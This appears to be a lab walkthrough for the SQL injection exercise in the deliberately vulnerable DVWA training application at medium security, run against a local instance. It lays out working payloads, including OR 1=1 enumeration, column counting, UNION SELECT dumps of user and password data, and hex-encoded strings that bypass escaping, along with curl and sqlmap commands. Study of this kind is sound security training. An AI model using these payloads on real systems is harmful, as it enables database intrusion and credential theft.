# DVWA SQL Injection — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/sqli/

## Vulnerable Parameter
id (POST parameter via dropdown select)

## Form Details
- Method: POST
- Input: Dropdown select (not free text input)
- Uses `mysql_real_escape_string()` on input
- Query: `SELECT first_name, last_name FROM users WHERE user_id = $id;`
- Note: No quotes around `$id` in query — numeric injection

## Key Differences from Low
1. Input is a dropdown (must intercept/modify request)
2. `mysql_real_escape_string()` escapes quotes
3. BUT the variable is used without quotes in SQL → numeric injection still works
4. POST instead of GET

## Detection
- Intercept POST request with curl/Burp
- Change `id=1` to `id=1 OR 1=1` — returns all users (no quotes needed)

## Working Payloads

### Enumerate all users (no quotes needed)
```
id=1 OR 1=1&Submit=Submit
```

### Column count
```
id=1 ORDER BY 2&Submit=Submit       ← works
id=1 ORDER BY 3&Submit=Submit       ← fails → 2 columns
```

### Union-based extraction (avoid single quotes)
```
id=1 UNION SELECT user(),database()&Submit=Submit
id=1 UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=0x64767761&Submit=Submit
id=1 UNION SELECT user,password FROM users&Submit=Submit
```
Note: `0x64767761` is hex encoding of "dvwa" — bypasses quote escaping

## Step-by-Step Exploitation
1. Intercept the POST request (dropdown sends `id=1`)
2. Modify POST body: `id=1 OR 1=1&Submit=Submit` — returns all users
3. Modify POST body: `id=1 UNION SELECT user(),database()&Submit=Submit`
4. Use hex encoding for string values: `0x64767761` instead of `'dvwa'`
5. Dump credentials: `id=1 UNION SELECT user,password FROM users&Submit=Submit`

## curl Commands
```bash
# Test basic injection
curl -X POST "http://127.0.0.1:4280/vulnerabilities/sqli/" \
  -d "id=1 OR 1=1&Submit=Submit" \
  -b "PHPSESSID=<session>;security=medium"

# Dump users
curl -X POST "http://127.0.0.1:4280/vulnerabilities/sqli/" \
  -d "id=1 UNION SELECT user,password FROM users&Submit=Submit" \
  -b "PHPSESSID=<session>;security=medium"
```

## sqlmap Command
```bash
sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=medium" --batch --dbs
```

## Bypass Techniques
- Numeric injection — no quotes needed since `$id` is unquoted in query
- Hex encoding for string literals: `'dvwa'` → `0x64767761`
- `CHAR()` function: `CHAR(100,118,119,97)` = "dvwa"

## Notes
- `mysql_real_escape_string()` only protects when value is inside quotes in SQL
- Since the query uses `WHERE user_id = $id` (no quotes), the escaping is useless
- Must use POST method (intercept or craft request manually)
